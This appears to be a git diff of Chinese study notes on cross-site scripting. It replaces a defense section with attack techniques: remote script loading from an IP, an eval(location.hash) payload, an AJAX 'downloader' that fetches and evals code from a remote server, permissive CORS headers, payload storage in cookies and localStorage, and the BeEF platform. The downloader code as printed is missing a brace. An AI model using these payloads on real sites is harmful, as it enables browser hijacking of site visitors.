@@ -1,28 +1,57 @@
-#### XSS的防御
+#### shellcode的调用
 
-1. 使用XSS Filter
+shellcode就是利用漏洞所执行的代码，完整的xss攻击会将shellcode存放在一定的地方，然后漏洞触发，调用shellcode
 
-   XSS Filter的作用是过滤用户（客户端）提交的有害信息，从而达到防范XSS攻击的效果
+1. 远程调用js
 
-   - 输入过滤，永远不要相信用户的输入，是网站开发的基本常识，对于用户输入一定要过滤、过滤、再过滤。适合sql注入
+   将js代码单独放在一个文件夹内，存放在一个可以网络访问到的服务器上，通过http协议远程加载该脚本，如：
 
-     1. 输入验证，对用户提交的数据进行有效验证，仅接受指定长度范围内的，采用适当格式的内容提交，阻止或者忽略除此之外的其他任何数据
+   `<script src="IP地址/XSS-TEST/normal/xss.js"></script>`
 
-        - 输入是否仅包含合法的字符
-        - 输入字符串是否超过最大长度限制
-        - 输入如果为数字，数字是否在指定的范围内
-        - 输入是否符合特殊的格式要求，如E-MAIL地址，IP地址等
+   这是最常见的方式，XSS.JS代码内容：`alert('xss.js');`
 
-     2. 数据消毒，过滤和净化有害的输入
+2. windows.location.hash
 
-        - 输出编码，HTML编码主要使用对应的HTML实体代替字符
+   我们也可以使用js中的windows.location.hash方法获取浏览器的URL地址栏的XSS代码，windows.location.hash会获取URL中 # 后面的内容，例如`http://domain.com/index.php#AJEST`，windows.location.hash的值就是#AJEST
 
-        - 黑白名单，不管是采用输入过滤还是输出过滤，都是针对数据信息进行黑或白名单式的过滤
+   构造的代码如下：
 
-          黑名单，非允许数据
+   `?submit=submit&xsscode=<script>eval(location.hash.substr(1))</script>#alert(/This is windows.location.hash/)`，提交到测试页面xss.php
 
-          白名单，允许的数据
+3. XSS downloader
 
-2. 防御DOM-XSS
+   XSS下载器就是将XSS代码写到网页中，然后通过AJAX技术，取得网页中的XSS代码。在使用XSS Downloader之前需要一个我们自己的页面，xss_downloader.php，内容如下：
 
-   避免客户端文档重写、重定向或其他敏感操作
+   `~~~~BOF|alert(/xss/)|EOF~~~~~~~~~~（波浪线代替html代码）`
+
+   常见的下载器代码如下：
+
+   `<script>
+   function XSS() {
+   	if (window.XMLHttpRequest) {
+   		a = new XMLHttpRequest() ;
+   	}else if (window.ActiveXObject) {
+   		a = new ActiveXObject( "Microsoft.XMLHTTP");
+   	else {return;}
+   	a.open('get',' http://IP/目录/xss_downloader.php',false) ;
+   	a.send() ;
+   	b=a.responseText;
+   	eval(unescape(b.substring(b.indexOf('BOF|')+4,b.indexOf('|EOF'))));}
+   XSS() ;
+   </script>`
+
+   - 注意：Ajax 受同源策略的限制，为了解决这个问题，我们需要在服务端代码中加入几句代码：
+
+     `<?php`
+
+     `header ('Access-Control-Allow-Origin: *') ;`
+
+     `header ('Access-Control-Allow-Headers: Origin, X-Requested-with， Content -Type，Accept') ;`
+
+     `?>`
+
+4. 备选存储技术
+
+   我们可以把shellcode存储在客户端本地域中，比如HTTP cookie、flash共享对象、userdata、localstorage等
+
+5. XSS神器，beef，是一款XSS漏洞利用平台，使用beef可以进行浏览器劫持
